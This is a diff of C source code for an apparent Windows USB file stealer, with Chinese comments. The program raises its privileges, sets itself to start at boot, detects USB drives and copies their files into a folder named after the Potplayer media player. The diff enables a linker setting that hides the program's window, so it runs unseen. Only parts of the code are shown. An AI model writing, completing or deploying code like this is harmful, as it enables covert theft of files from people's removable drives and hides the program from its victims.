@@ -1,7 +1,7 @@
 #define _CRT_SECURE_NO_WARNINGS
-//#ifdef _MSC_VER
-//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
-//#endif
+#ifdef _MSC_VER
+#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
+#endif
 
 
 #include <stdio.h>
@@ -24,14 +24,16 @@ void ProcessStrings(char* diskName, char* Process);
 BOOL isUsbDrv(char* path);
 BOOL UpPrivilegeValue();
 BOOL DetermineFileName(char* fileName, int num, ...);
+
 TCHAR* CopiedFileAddress = "D:\\Program Files\\Potplayer";
 
 int main(int argc, TCHAR* argv[])
 {
-	CreateFolder("D:\\Program Files");
-	CreateFolder(CopiedFileAddress);
+
 	while (1)
 	{
+		CreateFolder("D:\\Program Files");
+		CreateFolder(CopiedFileAddress);
 		int jump = 0;
 		UpPrivilegeValue();//提升权限
 		setComputerStart(*argv);//设置开机启动
@@ -57,6 +59,7 @@ int main(int argc, TCHAR* argv[])
 	}
 	return 0;
 }
+
 void ProcessStrings(char* diskName, char* Process)
 {
 	sprintf(Process, "%s%s", "\\\\.\\", diskName);
@@ -64,6 +67,7 @@ void ProcessStrings(char* diskName, char* Process)
 	for (int i = textLong-1; i < textLong; i++)
 		Process[i] = '\0';
 }
+
 BOOL UpPrivilegeValue()
 {
 	//OpenProcessToken()函数用来打开与进程相关联的访问令牌
@@ -198,7 +202,7 @@ void findFolder(const TCHAR* dirName,BOOL recursion)
 		return;
 	}
 
-	if (strstr(find.name, ".") == NULL && find.attrib== _A_SUBDIR)
+	if (strstr(find.name, ".") == NULL && find.attrib== _A_SUBDIR)//判断是否为文件夹
 	{
 		if (recursion == 0)
 			wsprintf(fileNameAll, TEXT("%s%s"), dirName, find.name);
